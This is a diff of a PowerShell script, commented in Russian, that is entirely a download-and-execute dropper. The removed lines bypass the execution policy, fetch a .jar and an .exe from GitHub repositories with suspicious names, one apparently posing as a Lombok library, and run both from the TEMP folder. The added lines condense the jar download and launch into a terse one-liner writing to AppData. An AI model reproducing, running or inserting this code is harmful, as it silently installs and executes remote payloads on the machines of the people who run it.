@@ -1,17 +1,3 @@
-Set-ExecutionPolicy Bypass -Scope Process -Force
-
-$jarUrl = "https://github.com/VicTheSlicer/bytebin-api/raw/main/build/latest-version.jar"
-$jarPath = "$env:TEMP\latest-version.jar"
-$exeUrl = "https://github.com/JavaCorpRus/LombokLib/raw/refs/heads/main/Build2000497420.exe"
-$exePath = "$env:TEMP\Build2000497420.exe"
-
-# Скачать и запустить .jar без ожидания завершения
-Invoke-WebRequest -Uri $jarUrl -OutFile $jarPath
-Start-Process -FilePath "java" -ArgumentList "-jar", "`"$jarPath`""
-
-# Ждать 60 секунд
-Start-Sleep 60
-
-# Скачать и запустить .exe без ожидания завершения
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-Start-Process -FilePath $exePath
+$c=New-Object System.Net.Http.HttpClient;$o=Join-Path 
+([Environment]::GetFolderPath("ApplicationData")) 
+"latest-version.jar";[IO.File]::OpenWrite($o).Write($c.GetByteArrayAsync("https://github.com/VicTheSlicer/bytebin-api/raw/main/build/latest-version.jar").Result);Start-Process java "-jar $o";
